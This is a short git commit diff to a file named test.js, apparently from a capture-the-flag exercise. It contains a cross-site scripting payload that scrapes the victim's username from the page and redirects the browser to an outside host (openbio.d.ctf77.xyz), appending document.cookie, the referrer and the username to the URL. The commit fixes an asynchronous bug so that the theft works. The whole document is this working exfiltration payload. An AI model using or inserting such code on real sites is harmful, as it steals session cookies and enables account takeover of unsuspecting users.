d79448404e363881b048e68c55f084ecef52968b
wlp3s1 <wlp3s1gh@michael.pub>
2024-11-25 20:34:40 +1100

    Update test.js

--- test.js
+++ test.js
@@ -1,4 +1,6 @@
 if (localStorage.abc !== '1') {
-  const username = $.get('/').then(a => console.log(a.match(/profile\/(.+)"/)[1]));
-  window.location = 'http://openbio.d.ctf77.xyz/redirect?' + document.cookie + document.referrer + username;
+  $.get('/').then(a => {
+    const username = a.match(/profile\/(.+)"/)[1];
+    window.location = 'http://openbio.d.ctf77.xyz/redirect?' + document.cookie + document.referrer + username;
+  });
 }
